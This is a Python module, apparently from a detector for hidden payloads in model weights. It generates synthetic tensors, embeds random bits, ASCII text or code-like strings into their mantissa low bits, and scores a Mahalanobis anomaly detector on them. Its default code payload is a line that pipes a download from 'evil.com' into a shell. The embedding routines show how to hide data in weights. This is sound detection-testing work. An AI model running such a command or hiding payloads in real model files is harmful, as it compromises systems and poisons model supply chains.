"""
Synthetic Experiment Framework — Generates controlled test datasets and
evaluates the detection engine.

All synthetic data is clearly labeled as synthetic. This module does NOT
claim that experimental performance matches the research paper's results.

Experiment Types:
1. Clean FP32 tensors (normally distributed weights)
2. Clean FP16 tensors
3. FP16 → FP32 converted tensors
4. Random payload embedding (uniform random LSB replacement)
5. ASCII text payload embedding
6. Code-like payload embedding
"""

import numpy as np
from typing import List, Dict, Any, Optional, Tuple
from sklearn.metrics import (
    accuracy_score, precision_score, recall_score, f1_score,
    roc_auc_score, confusion_matrix, roc_curve
)
import logging
import json

from app.engine.features import extract_all_features, FEATURE_NAMES
from app.engine.detector import MahalanobisDetector

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────
# Synthetic Tensor Generation
# ─────────────────────────────────────────────────────────────────────

def generate_clean_fp32(shape: Tuple[int, ...] = (512, 512), seed: int = 42) -> np.ndarray:
    """Generate clean FP32 tensor with normally distributed weights."""
    rng = np.random.RandomState(seed)
    return rng.randn(*shape).astype(np.float32) * 0.02


def generate_clean_fp16(shape: Tuple[int, ...] = (512, 512), seed: int = 42) -> np.ndarray:
    """Generate clean FP16 tensor."""
    rng = np.random.RandomState(seed)
    return (rng.randn(*shape) * 0.02).astype(np.float16)


def generate_fp16_to_fp32(shape: Tuple[int, ...] = (512, 512), seed: int = 42) -> np.ndarray:
    """Generate FP16 tensor converted back to FP32 (precision-history scenario)."""
    fp16 = generate_clean_fp16(shape, seed)
    return fp16.astype(np.float32)


def embed_random_payload(
    tensor: np.ndarray,
    fraction: float = 1.0,
    num_bits: int = 1,
    seed: int = 99,
) -> np.ndarray:
    """
    Embed uniformly random bits into the LSB(s) of the mantissa.
    
    Args:
        tensor: Clean FP32 tensor.
        fraction: Fraction of elements to modify (0.0 to 1.0).
        num_bits: Number of LSBs to replace.
        seed: Random seed for reproducibility.
    """
    rng = np.random.RandomState(seed)
    flat = tensor.flatten().astype(np.float32)
    bits = flat.view(np.uint32)
    
    n_modify = int(len(bits) * fraction)
    indices = rng.choice(len(bits), n_modify, replace=False)
    
    mask = (1 << num_bits) - 1
    payload_bits = rng.randint(0, mask + 1, n_modify, dtype=np.uint32)
    
    bits[indices] = (bits[indices] & ~np.uint32(mask)) | payload_bits
    
    result = bits.view(np.float32).reshape(tensor.shape)
    return result


def embed_ascii_payload(
    tensor: np.ndarray,
    message: str = "HIDDEN SECRET DATA IN MODEL WEIGHTS",
    seed: int = 99,
) -> np.ndarray:
    """
    Embed ASCII text into LSBs of the mantissa.
    
    Each character is encoded as 8 bits, spread across 8 consecutive weight LSBs.
    """
    flat = tensor.flatten().astype(np.float32)
    bits = flat.view(np.uint32)
    
    # Convert message to bits
    msg_bits = []
    for ch in message:
        byte_val = ord(ch)
        for bit_pos in range(8):
            msg_bits.append((byte_val >> bit_pos) & 1)
    
    # Embed bits into LSBs, repeating the message to fill
    for i in range(len(bits)):
        msg_bit = msg_bits[i % len(msg_bits)]
        bits[i] = (bits[i] & ~np.uint32(1)) | np.uint32(msg_bit)
    
    result = bits.view(np.float32).reshape(tensor.shape)
    return result


def embed_code_payload(
    tensor: np.ndarray,
    code: str = "import os; os.system('curl evil.com/malware | sh')",
    seed: int = 99,
) -> np.ndarray:
    """Embed code-like payload — same mechanism as ASCII but with code content."""
    return embed_ascii_payload(tensor, message=code, seed=seed)


# ─────────────────────────────────────────────────────────────────────
# Experiment Runner
# ─────────────────────────────────────────────────────────────────────

def generate_experiment_dataset(
    n_clean: int = 20,
    n_embedded: int = 20,
    tensor_shape: Tuple[int, ...] = (512, 512),
    base_seed: int = 42,
) -> Tuple[List[Dict], List[int]]:
    """
    Generate a labeled synthetic dataset.
    
    Returns:
        features_list: List of feature dicts for each tensor.
        labels: List of labels (0 = clean, 1 = embedded).
    """
    features_list = []
    labels = []
    
    # Clean tensors
    for i in range(n_clean):
        if i % 3 == 0:
            tensor = generate_clean_fp32(tensor_shape, seed=base_seed + i)
        elif i % 3 == 1:
            tensor = generate_clean_fp16(tensor_shape, seed=base_seed + i).astype(np.float32)
        else:
            tensor = generate_fp16_to_fp32(tensor_shape, seed=base_seed + i)
        
        result = extract_all_features(tensor, tensor_name=f"clean_{i}")
        features_list.append(result["features"])
        labels.append(0)
    
    # Embedded tensors
    for i in range(n_embedded):
        base_tensor = generate_clean_fp32(tensor_shape, seed=base_seed + n_clean + i)
        
        if i % 3 == 0:
            tensor = embed_random_payload(base_tensor, seed=base_seed + 1000 + i)
        elif i % 3 == 1:
            tensor = embed_ascii_payload(base_tensor, seed=base_seed + 2000 + i)
        else:
            tensor = embed_code_payload(base_tensor, seed=base_seed + 3000 + i)
        
        result = extract_all_features(tensor, tensor_name=f"embedded_{i}")
        features_list.append(result["features"])
        labels.append(1)
    
    return features_list, labels


def run_experiment(
    n_clean: int = 30,
    n_embedded: int = 30,
    train_ratio: float = 0.4,
    calibration_ratio: float = 0.2,
    tensor_shape: Tuple[int, ...] = (256, 256),
    seed: int = 42,
) -> Dict[str, Any]:
    """
    Run a complete detection experiment with train/calibration/test splits.
    
    IMPORTANT: Train and calibration sets only contain clean data.
    Test set contains both clean and embedded data.
    """
    features, labels = generate_experiment_dataset(
        n_clean=n_clean, n_embedded=n_embedded,
        tensor_shape=tensor_shape, base_seed=seed,
    )
    
    # Split: train and calibration use only clean data
    clean_indices = [i for i, l in enumerate(labels) if l == 0]
    embedded_indices = [i for i, l in enumerate(labels) if l == 1]
    
    rng = np.random.RandomState(seed)
    rng.shuffle(clean_indices)
    
    n_train = int(len(clean_indices) * train_ratio)
    n_calib = int(len(clean_indices) * calibration_ratio)
    
    train_idx = clean_indices[:n_train]
    calib_idx = clean_indices[n_train:n_train + n_calib]
    test_clean_idx = clean_indices[n_train + n_calib:]
    test_idx = test_clean_idx + embedded_indices
    
    if len(train_idx) < 2:
        raise ValueError("Not enough clean samples for training split.")
    
    train_features = [features[i] for i in train_idx]
    calib_features = [features[i] for i in calib_idx]
    test_features = [features[i] for i in test_idx]
    test_labels = [labels[i] for i in test_idx]
    
    # Fit detector
    detector = MahalanobisDetector()
    detector.fit(train_features)
    
    # Calibrate
    if len(calib_features) >= 5:
        detector.calibrate(calib_features, false_positive_rate=0.05)
    
    # Test
    predictions = []
    scores = []
    for feat in test_features:
        result = detector.score_tensor(feat, "test")
        score = result.anomaly_score
        scores.append(score)
        pred = 0 if result.risk_classification == "normal" else 1
        predictions.append(pred)
    
    test_labels_arr = np.array(test_labels)
    predictions_arr = np.array(predictions)
    scores_arr = np.array(scores)
    
    # Metrics
    results = {
        "experiment_type": "synthetic",
        "n_clean": n_clean,
        "n_embedded": n_embedded,
        "tensor_shape": list(tensor_shape),
        "train_size": len(train_idx),
        "calibration_size": len(calib_idx),
        "test_size": len(test_idx),
        "thresholds": {
            "suspicious": detector.suspicious_threshold,
            "high_anomaly": detector.high_anomaly_threshold,
        },
    }
    
    # Only compute metrics if we have both classes in test set
    if len(set(test_labels)) >= 2:
        results["metrics"] = {
            "accuracy": float(accuracy_score(test_labels_arr, predictions_arr)),
            "precision": float(precision_score(test_labels_arr, predictions_arr, zero_division=0)),
            "recall": float(recall_score(test_labels_arr, predictions_arr, zero_division=0)),
            "f1_score": float(f1_score(test_labels_arr, predictions_arr, zero_division=0)),
            "roc_auc": float(roc_auc_score(test_labels_arr, scores_arr)),
            "confusion_matrix": confusion_matrix(test_labels_arr, predictions_arr).tolist(),
        }
        
        # FPR / TPR at threshold
        n_test_clean = sum(1 for l in test_labels if l == 0)
        n_test_embedded = sum(1 for l in test_labels if l == 1)
        fp = sum(1 for l, p in zip(test_labels, predictions) if l == 0 and p == 1)
        tp = sum(1 for l, p in zip(test_labels, predictions) if l == 1 and p == 1)
        
        results["metrics"]["false_positive_rate"] = float(fp / n_test_clean) if n_test_clean > 0 else 0.0
        results["metrics"]["true_positive_rate"] = float(tp / n_test_embedded) if n_test_embedded > 0 else 0.0
    else:
        results["metrics"] = {"note": "Only one class in test set — cannot compute full metrics."}
    
    results["disclaimer"] = (
        "These results are from synthetic experiments using controlled test data. "
        "Do NOT claim that experimental performance matches the research paper "
        "until independently reproduced on real-world model datasets."
    )
    
    return results
